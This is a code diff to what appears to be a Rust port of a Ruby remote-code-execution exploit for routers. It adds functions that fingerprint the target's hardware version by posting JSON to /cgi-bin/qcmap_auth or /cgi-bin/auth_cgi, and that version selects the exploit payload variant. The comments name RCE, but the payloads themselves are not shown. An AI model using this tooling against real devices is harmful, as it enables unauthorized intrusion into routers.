@@ -15,7 +15,7 @@ struct Args {
     #[arg(required = true)]
     token: String,
 	
-	#[arg(long, default_value_t = 1)]
+	#[arg(long, default_value_t = 0)]
 	hw_version: u8
 
 }
@@ -85,6 +85,106 @@ enum Payload {
 	V5(PayloadV5),
 	CleanupV5(PayloadCleanupV5)
 }
+
+/*
+    def detect_v1
+        login_data = {"module": "authenticator", "action": 0}.to_json
+        res = Curl.post("http://#{@options[:target]}/cgi-bin/qcmap_auth", login_data) do |http|
+            http.headers["Content-Type"] = "application/json"
+        end
+        
+        return false if res.code == 404
+        return true if res.code == 200
+        return nil
+    end
+*/
+
+async fn detect_v1() -> bool {
+
+	let login_data = Auth{
+		module: String::from("authenticator"),
+		action: 0,
+		digest: String::from("xxx")
+	};
+
+	let client = reqwest::Client::new();
+
+	let payload_str = serde_json::to_string(&login_data).unwrap();
+
+	let resp = client.post("http://192.168.0.1/cgi-bin/qcmap_auth")
+		.body(payload_str)
+		.send()
+		.await;
+
+    println!("{resp:#?}");
+
+	resp.unwrap().status().is_success()
+}
+/* 
+    def detect_v5
+        login_data = {"module": "authenticator", "action": 0}.to_json
+        res = Curl.post("http://#{@options[:target]}/cgi-bin/auth_cgi", login_data) do |http|
+            http.headers["Content-Type"] = "application/json"
+        end
+        
+        return false if res.code == 404
+        return true if res.code == 200
+        return nil
+    end
+*/
+
+async fn detect_v5() -> bool {
+
+	let login_data = Auth{
+		module: String::from("authenticator"),
+		action: 0,
+		digest: String::from("xxx")
+	};
+
+	let client = reqwest::Client::new();
+
+	let payload_str = serde_json::to_string(&login_data).unwrap();
+
+	let resp = client.post("http://192.168.0.1/cgi-bin/auth_cgi")
+		.body(payload_str)
+		.send()
+		.await;
+
+    println!("{resp:#?}");
+
+	resp.unwrap().status().is_success()
+}
+
+/*
+    def detect_version
+        
+        if @options[:rce] == 1 || detect_v1
+            @options[:rce] = 1
+            @options[:cgi_path] = "qcmap_auth"
+            puts "[ok] Detected v1"
+        elsif @options[:rce] == 5 || detect_v5
+            @options[:rce] = 5
+            @options[:cgi_path] = "auth_cgi"
+            puts "[ok] Detected v5"
+        else
+            raise "No suitable RCE found"
+        end
+    end
+*/
+
+async fn detect_version() -> std::result::Result<u8,String> {
+
+	if detect_v1().await {
+		Ok(1)
+	} else if detect_v5().await {
+		Ok(5)
+	} else {
+		Err("HW Version not found".to_string())
+	}
+}
+
+
+
 
 fn get_payload(version: u8, token: &String, cleanup: bool) -> Payload {
 
@@ -156,7 +256,17 @@ async fn main()  {
 
 	let args = Args::parse();
 	let token = args.token;
-	let version = args.hw_version;
+	let arg_version = args.hw_version;
+
+	let version: u8;
+
+	if arg_version == 0 {
+		version = detect_version().await.unwrap();
+	} else {
+		version = arg_version;
+	}
+
+	println!("{version:#?}");
 
 	// TODO implement AUTH
 
